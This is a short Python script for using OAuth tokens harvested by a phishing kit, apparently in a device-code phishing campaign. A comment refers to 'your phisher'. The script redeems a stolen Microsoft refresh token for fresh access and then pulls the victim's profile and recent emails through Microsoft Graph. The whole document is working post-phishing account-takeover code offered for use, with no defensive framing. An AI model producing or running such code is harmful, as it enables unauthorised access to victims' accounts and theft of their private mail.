import requests
import json

# === YOUR TOKENS ===
access_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6..."  # paste here
refresh_token = "0.A..."  # paste here (much longer)

client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"   # same as in your phisher

def refresh_access_token(refresh_token):
    url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    data = {
        'client_id': client_id,
        'scope': 'openid profile offline_access https://graph.microsoft.com/.default',
        'refresh_token': refresh_token,
        'grant_type': 'refresh_token'
    }
    r = requests.post(url, data=data)
    result = r.json()
    
    if 'access_token' in result:
        print("✅ New access token received!")
        print("Expires in:", result.get('expires_in'), "seconds")
        # Optionally save new refresh_token if returned
        if 'refresh_token' in result:
            print("New refresh token received")
        return result['access_token'], result.get('refresh_token')
    else:
        print("❌ Refresh failed:", result)
        return None, None

def call_graph(endpoint, token):
    headers = {'Authorization': f'Bearer {token}'}
    r = requests.get(f"https://graph.microsoft.com/v1.0/{endpoint}", headers=headers)
    return r.json()

# Example usage
new_access, new_refresh = refresh_access_token(refresh_token)

if new_access:
    # Get user info
    print(call_graph("me", new_access))
    
    # Read recent emails
    emails = call_graph("me/messages?$top=10", new_access)
    print(json.dumps(emails, indent=2))